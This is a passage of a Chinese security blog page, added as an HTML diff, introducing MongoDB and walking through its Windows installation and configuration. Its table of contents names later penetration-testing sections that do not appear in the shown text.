@@ -1,0 +1,571 @@
+<!DOCTYPE html>
+<html lang='en'>
+
+<head>
+  <meta name="generator" content="Hexo 5.4.0">
+  <meta charset="utf-8">
+  
+
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel='dns-prefetch' href='https://cdn.jsdelivr.net'>
+  <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
+
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  <title>数据库攻防之MongoDB渗透基础 - T0x1c</title>
+
+  
+    <meta name="description" content="MongoDB是一个安全性相对较高的非关系型数据库，它的安全问题主要出现在使用、配置过程当中。目前随着MongoDB的流行，它也成为了红队攻防领域不可忽视的数据库。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="数据库攻防之MongoDB渗透基础">
+<meta property="og:url" content="https://toxic80l.github.io/post/f10b0bf1/index.html">
+<meta property="og:site_name" content="T0x1c">
+<meta property="og:description" content="MongoDB是一个安全性相对较高的非关系型数据库，它的安全问题主要出现在使用、配置过程当中。目前随着MongoDB的流行，它也成为了红队攻防领域不可忽视的数据库。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://toxic80l.github.io/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-02%20%E4%B8%8B%E5%8D%883.18.35.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-07%20%E4%B8%8B%E5%8D%885.12.49.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-07%20%E4%B8%8B%E5%8D%885.14.01.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-07%20%E4%B8%8B%E5%8D%885.13.52.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-07%20%E4%B8%8B%E5%8D%885.14.08.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-07%20%E4%B8%8B%E5%8D%885.15.26.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-07%20%E4%B8%8B%E5%8D%885.16.06.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-07%20%E4%B8%8B%E5%8D%885.18.21.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-07%20%E4%B8%8B%E5%8D%886.01.44.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-07%20%E4%B8%8B%E5%8D%885.59.47.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-07%20%E4%B8%8B%E5%8D%886.05.17.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-07%20%E4%B8%8B%E5%8D%886.08.27.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-07%20%E4%B8%8B%E5%8D%883.03.30.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-07%20%E4%B8%8B%E5%8D%883.02.46.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-07%20%E4%B8%8B%E5%8D%883.05.33.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-07%20%E4%B8%8B%E5%8D%886.37.48.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-07%20%E4%B8%8B%E5%8D%886.46.57.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-07%20%E4%B8%8B%E5%8D%889.59.09.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-07%20%E4%B8%8B%E5%8D%886.57.03.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-07%20%E4%B8%8B%E5%8D%886.59.16.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-07%20%E4%B8%8B%E5%8D%886.59.32.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-07%20%E4%B8%8B%E5%8D%883.34.18.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-07%20%E4%B8%8B%E5%8D%884.26.06.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-07%20%E4%B8%8B%E5%8D%883.35.40.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-07%20%E4%B8%8B%E5%8D%883.39.04.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-07%20%E4%B8%8B%E5%8D%883.42.06.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-07%20%E4%B8%8B%E5%8D%883.52.55.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-07%20%E4%B8%8B%E5%8D%883.51.54.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-07%20%E4%B8%8B%E5%8D%883.56.33.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f10b0bf1/1.jpg">
+<meta property="og:image" content="https://toxic80l.github.io/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-08%20%E4%B8%8A%E5%8D%8812.01.13.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-08%20%E4%B8%8A%E5%8D%8812.05.48.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-08%20%E4%B8%8A%E5%8D%8812.27.49.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-08%20%E4%B8%8A%E5%8D%881.59.28.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-08%20%E4%B8%8A%E5%8D%882.01.01.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-08%20%E4%B8%8A%E5%8D%882.10.37.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-08%20%E4%B8%8A%E5%8D%882.10.48.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-08%20%E4%B8%8A%E5%8D%882.28.59.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-08%20%E4%B8%8A%E5%8D%882.29.36.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-08%20%E4%B8%8A%E5%8D%882.33.56.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-08%20%E4%B8%8A%E5%8D%882.37.13.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-08%20%E4%B8%8A%E5%8D%882.45.07.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-08%20%E4%B8%8A%E5%8D%882.51.13.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-08%20%E4%B8%8A%E5%8D%883.06.14.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-08%20%E4%B8%8A%E5%8D%883.07.17.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-08%20%E4%B8%8A%E5%8D%883.08.14.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-08%20%E4%B8%8A%E5%8D%883.10.17.png">
+<meta property="article:published_time" content="2022-04-13T19:40:16.000Z">
+<meta property="article:modified_time" content="2022-04-13T20:24:22.352Z">
+<meta property="article:author" content="toxic80L">
+<meta property="article:tag" content="mongodb">
+<meta property="article:tag" content="数据库">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://toxic80l.github.io/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-02%20%E4%B8%8B%E5%8D%883.18.35.png">
+  
+  
+
+  <!-- feed -->
+  
+
+  
+    
+<link rel="stylesheet" href="/css/main.css">
+
+  
+
+  
+
+  
+</head>
+
+<body>
+  
+
+
+  <div class='l_body' id='start'>
+    <aside class='l_left' layout='post'>
+    
+
+
+<header class="header">
+
+<div class="logo-wrap"><a class="avatar" href="/medias/avatar.png"><div class="bg" style="opacity:0;background-image:url(https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.2/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/avatar.png" onerror="javascript:this.classList.add('error');this.src='https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.1/image/2659360.svg';"></a><a class="title" href="/"><div class="main">T0x1c</div><div class="sub cap">我在听你的独家记忆</div></a></div>
+<nav class="menu dis-select"><a class="nav-item active" href="/">Blog</a><a class="nav-item" href="/wiki/">Wiki</a><a class="nav-item" href="/notes/">notes</a><a class="nav-item" href="/friends/">more</a></nav></header>
+
+<div class="widgets">
+
+<div class="widget-wrap single" id="toc"><div class="widget-header cap dis-select"><span class="name">TOC</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-MongoDB%E7%AE%80%E4%BB%8B"><span class="toc-text">0x01 MongoDB简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-MongoDB%E5%AE%89%E8%A3%85"><span class="toc-text">0x02 MongoDB安装</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MongoDB%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE"><span class="toc-text">MongoDB安装配置</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Windows%E4%B8%8B%E5%AE%89%E8%A3%85"><span class="toc-text">Windows下安装</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux%E4%B8%8B%E5%AE%89%E8%A3%85"><span class="toc-text">Linux下安装</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MongoDB%E8%BF%9E%E6%8E%A5"><span class="toc-text">MongoDB连接</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Windows%E4%B8%8B%E8%BF%9E%E6%8E%A5"><span class="toc-text">Windows下连接</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux%E4%B8%8B%E8%BF%9E%E6%8E%A5"><span class="toc-text">Linux下连接</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-MongoDB%E5%9F%BA%E7%A1%80%E7%94%A8%E6%B3%95"><span class="toc-text">0x03 MongoDB基础用法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C"><span class="toc-text">基础操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A9%E5%B1%95%EF%BC%9A%E8%87%AA%E6%90%AD%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83"><span class="toc-text">扩展：自搭渗透环境</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">创建数据库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%92%E5%85%A5%E6%95%B0%E6%8D%AE"><span class="toc-text">插入数据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%89%E8%A3%85MongoDB%E9%A9%B1%E5%8A%A8"><span class="toc-text">安装MongoDB驱动</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-MongoDB%E6%B8%97%E9%80%8F"><span class="toc-text">0x04 MongoDB渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-text">SQL注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E7%99%BB%E5%BD%95"><span class="toc-text">未授权登录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E5%8C%96%E8%AF%84%E4%BC%B0"><span class="toc-text">自动化评估</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#NoSQLMap%E4%BB%8B%E7%BB%8D"><span class="toc-text">NoSQLMap介绍</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NoSQLMap%E7%89%B9%E6%80%A7"><span class="toc-text">NoSQLMap特性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NoSQLMap%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8"><span class="toc-text">NoSQLMap安装使用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-MongoDB%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4"><span class="toc-text">0x05 MongoDB安全防护</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3"><span class="toc-text">漏洞危害</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81"><span class="toc-text">漏洞验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B4%E6%94%B9%E5%BB%BA%E8%AE%AE"><span class="toc-text">整改建议</span></a></li></ol></li></ol></div></div></div>
+
+
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/toxic80L" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.3/social/08a41b181ce68.svg"/></a></div></footer>
+
+    </aside>
+    <div class='l_main'>
+      
+
+      
+
+
+<div class="bread-nav fs12"><div id="breadcrumb"><a class="cap breadcrumb" href="/">Home</a><span class="sep"></span><a class="cap breadcrumb" href="/">Blog</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/">红队攻防</a></div><div id="post-meta">Posted on&nbsp;<time datetime="2022-04-13T19:40:16.000Z">2022-04-14</time></div></div>
+
+<article class='content md post'>
+<h1 class="article-title"><span>数据库攻防之MongoDB渗透基础</span></h1>
+<p>MongoDB是一个安全性相对较高的非关系型数据库，它的安全问题主要出现在使用、配置过程当中。目前随着MongoDB的流行，它也成为了红队攻防领域不可忽视的数据库。<span id="more"></span></p>
+<h2 id="0x01-MongoDB简介"><a href="#0x01-MongoDB简介" class="headerlink" title="0x01 MongoDB简介"></a>0x01 MongoDB简介</h2><p>MongoDB 是一个由C++编写、基于分布式文件存储的开源数据库系统，旨在为 web 应用提供可扩展的高性能数据存储解决方案。它将数据存储为一个文档，数据结构由键值对组成，文档类似于 JSON 对象。字段值可以包含其他文档、数组以及文档数组。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;mac&quot;</span>,</span><br><span class="line">    <span class="attr">age</span>: <span class="string">&quot;20&quot;</span>,</span><br><span class="line">    <span class="attr">job</span>: <span class="string">&quot;pentestor&quot;</span>,</span><br><span class="line">    <span class="attr">habits</span>: [<span class="string">&quot;music&quot;</span>, <span class="string">&quot;pentest&quot;</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>MongoDB是一个面向文档存储的数据库，默认端口是27017。与此同时它作为最像关系型数据库的非关系型数据库，操作起来也相对比较简单，以下为 MongoDB 的特点及优点：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">、MongoDB可在本地或网络中创建数据镜像，这使得它拥有更强的扩展性。</span></span><br><span class="line"><span class="number">2</span><span class="string">、MongoDB支持丰富的查询表达式，查询指令使用JSON形式的标记，可轻易查询文档中内嵌的对象及数组。</span></span><br><span class="line"><span class="number">3</span><span class="string">、MongoDB支持各种编程语言，包括Ruby、Python、Java、PHP、C#等。</span></span><br><span class="line"><span class="number">4</span><span class="string">、MongoDB使用Map/Reduce来对数据进行批量处理和聚合操作，Map函数调用emit(kr,value)遍历集合中的所有记录，将key、value传递给Reduce进行处理。</span></span><br><span class="line"><span class="number">5</span><span class="string">、MongoDB安装、操作非常简单。</span></span><br></pre></td></tr></table></figure>
+
+<p>由于NoSQL数据库适用于超大规模数据的存储，因此使用NoSQL数据库的场景也越来越多，例如我们熟知的Google、Facebook等全球大型互联网公司都在使用它来处理数以万计的数据信息。而MongoDB作为NoSQL数据库，它的的安全性主要由组成生态系统的各个部分共同负责。虽然MongoDB中具有一些内置的安全功能，但是由于在使用过程中会出现配置错误、更新不及时等问题，从而有可能导致漏洞的产生。</p>
+<h2 id="0x02-MongoDB安装"><a href="#0x02-MongoDB安装" class="headerlink" title="0x02 MongoDB安装"></a>0x02 MongoDB安装</h2><h3 id="MongoDB安装配置"><a href="#MongoDB安装配置" class="headerlink" title="MongoDB安装配置"></a>MongoDB安装配置</h3><h4 id="Windows下安装"><a href="#Windows下安装" class="headerlink" title="Windows下安装"></a>Windows下安装</h4><p><strong>下载地址：<a target="_blank" rel="noopener" href="https://www.mongodb.com/download-center/community">https://www.mongodb.com/download-center/community</a></strong><br>目前市场上 MongoDB 的主流版本是3.4和3.6，但我们在本地以4.x为例进行安装。在官网中提供了可用于32位和64位系统的预编译二进制包，需要注意的是MongoDB2.2之后的版本已经不再支持Windows XP系统了。<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-02%20%E4%B8%8B%E5%8D%883.18.35.png" alt="截屏2021-11-02 下午3.18.35"></p>
+<p>MongoDB为Windows提供了两种安装方式，分别是msi和zip方式。前者方便快捷，但只推荐4.0版本以上使用该方式进行安装，这主要是因为4.x版本对msi安装方式进行了优化，而3.x和更低的版本都需要在安装完毕后手动进行配置。后者解压即安装，相对来说比较灵活，可以将其安装至任意目录。以下则是不同WIndows系统版本适合的MongoDB版本信息：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">.</span> <span class="string">MongoDB</span> <span class="string">for</span> <span class="string">Windows</span> <span class="number">64</span><span class="string">-bit</span> <span class="string">适合</span> <span class="number">64</span><span class="string">位</span> <span class="string">Windows</span> <span class="string">Server</span> <span class="number">2008 </span><span class="string">R2,</span> <span class="string">Windows</span> <span class="number">7</span> <span class="string">,以及最新版本的Windows系统</span></span><br><span class="line"><span class="number">2</span><span class="string">.</span> <span class="string">MongoDB</span> <span class="string">for</span> <span class="string">Windows</span> <span class="number">32</span><span class="string">-bit</span> <span class="string">适合</span> <span class="number">32</span><span class="string">位</span> <span class="string">的Window</span> <span class="string">系统及最新的Windows</span> <span class="string">Vista，32位系统的的MongoDB最大数据库位2GB</span></span><br><span class="line"><span class="number">3</span><span class="string">.</span> <span class="string">MongoDB</span> <span class="string">for</span> <span class="string">Windows</span> <span class="number">64</span><span class="string">-bit</span> <span class="string">Legacy</span> <span class="string">适合</span> <span class="number">64</span><span class="string">位</span> <span class="string">的</span> <span class="string">Windows</span> <span class="string">Vista,</span> <span class="string">Windows</span> <span class="string">Server</span> <span class="number">2003</span><span class="string">,</span> <span class="string">݊</span> <span class="string">Windows</span> <span class="string">Server</span> <span class="number">2008</span></span><br></pre></td></tr></table></figure>
+
+<p>双击运行即可使用 msi 方式安装 MongoDB<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-07%20%E4%B8%8B%E5%8D%885.12.49.png" alt="截屏2021-11-07 下午5.12.49"><br>通过<code>Custom</code>自定义安装目录<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-07%20%E4%B8%8B%E5%8D%885.14.01.png" alt="截屏2021-11-07 下午5.14.01"><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-07%20%E4%B8%8B%E5%8D%885.13.52.png" alt="截屏2021-11-07 下午5.13.52"><br>选择不安装compass（MongoDB图形化管理工具），如果安装的话会需要花费较多的时间<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-07%20%E4%B8%8B%E5%8D%885.14.08.png" alt="截屏2021-11-07 下午5.14.08"><br>安装完成<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-07%20%E4%B8%8B%E5%8D%885.15.26.png" alt="截屏2021-11-07 下午5.15.26"></p>
+<p>MongoDB的bin目录中存在两个应用，分别是<code>mongo.exe</code>和<code>mongod.exe</code>，分别是MongoDB的客户端软件以及服务端软件。<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-07%20%E4%B8%8B%E5%8D%885.16.06.png" alt="截屏2021-11-07 下午5.16.06"></p>
+<p>与此同时将 MongoDB 的bin目录添加至环境变量中<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-07%20%E4%B8%8B%E5%8D%885.18.21.png" alt="截屏2021-11-07 下午5.18.21"></p>
+<p>编写配置文件<code>mongod.cfg</code>（MongDB 3.x中不包含该文件，需要自己创建目录来制作服务），以便于后续以配置文件的方式启动 MongoDB 服务</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">systemLog:</span></span><br><span class="line">    <span class="attr">destination:</span> <span class="string">file</span> <span class="string">//设置日志存储文件</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">C:\mongodb\log\mongodb.log</span>  <span class="string">//设置日志存储位置</span></span><br><span class="line">    <span class="attr">logAppend:</span> <span class="literal">true</span> <span class="string">//设置日志是否以追加形式记录</span></span><br><span class="line">    </span><br><span class="line"><span class="attr">storage:</span></span><br><span class="line">    <span class="attr">journal:</span> </span><br><span class="line">        <span class="attr">enabled:</span> <span class="literal">true</span> <span class="string">//设置是否回滚日志</span></span><br><span class="line">    <span class="attr">dbPath:</span> <span class="string">C:\mongodb\data</span> <span class="string">//设置数据存储目录</span></span><br><span class="line">    </span><br><span class="line"><span class="attr">net:</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">27017</span> <span class="string">//绑定端口</span></span><br><span class="line">    <span class="attr">bindIp:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="string">//绑定IP，如果需要远程登录需要配置本地IP</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-07%20%E4%B8%8B%E5%8D%886.01.44.png" alt="截屏2021-11-07 下午6.01.44"></p>
+<p>为了能在终端中可以通过<code>net</code>命令来管理MongoDB，我们可以将 MongoDB 服务添加至服务中去，当然前提是我们要以管理员身份执行终端。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mongod --config <span class="string">&quot;c:\Program Files\MongDB\Server\4.0\bin\mongod.cfg&quot;</span> --install</span><br></pre></td></tr></table></figure>
